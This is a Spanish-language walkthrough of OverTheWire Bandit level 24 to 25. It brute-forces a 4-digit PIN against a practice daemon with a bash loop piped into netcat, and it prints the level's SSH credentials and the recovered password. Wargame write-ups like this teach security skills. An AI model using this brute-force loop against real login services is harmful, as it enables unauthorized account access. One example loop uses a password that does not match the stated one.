# Level 24 - 25
---
## Objetivo 
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

---
## Datos de acceso al nivel 

```
Server  : **bandit.labs.overthewire.org**
User    : **bandit24**
Pasword : **VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar**
Puerto  : 2220 
```

---
## Solución 

**Primero se accede al servidor**
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
**Contraseña de usuario**
```
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

**Después se hace lo siguiente en la consola**

```bash

nc -v localhost 30002
# Connection to localhost (127.0.0.1) 30002 port [tcp/*] succeeded!
# I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line,
# separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 123
# Wrong! Please enter the correct pincode. Try again.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 987
# Wrong! Please enter the correct pincode. Try again.

## hacerlo de este modo genera mucho espacio en la consola 
for i in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i ; done
# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003

```

**Forma correcta u optima** 

```bash
## esta es la forma correcta ya que evita que la consola se llene de basura 
for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong

# I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single
# line, separated by a space.
# Correct!
# The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```

**Resultado final**

```
p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```

---
## Notas Adicionales 

Al momento de ingresar un comando también se le puede aplicar un poco de programación  para que el comando sea mas eficiente.  

|**Comando** | **Descripción** |
|:---------:|:-------------|
| grep -v |con esta opción, se nos muestran las líneas que no coinciden con el patrón que hemos buscado|

---
## Referencias 
[Grep: Qué es y cómo usarlo | OpenWebinars](https://openwebinars.net/blog/grep-que-es-y-como-usarlo/#:~:text=grep%20-E%20%27patr%C3%B3n1%27%20fichero.txt%20%7C%20grep%20-E%20%27patr%C3%B3n2%27.,excepto%20el%20patr%C3%B3n%20dado.%20grep%20-v%20%27patr%C3%B3n1%27%20fichero.txt.)
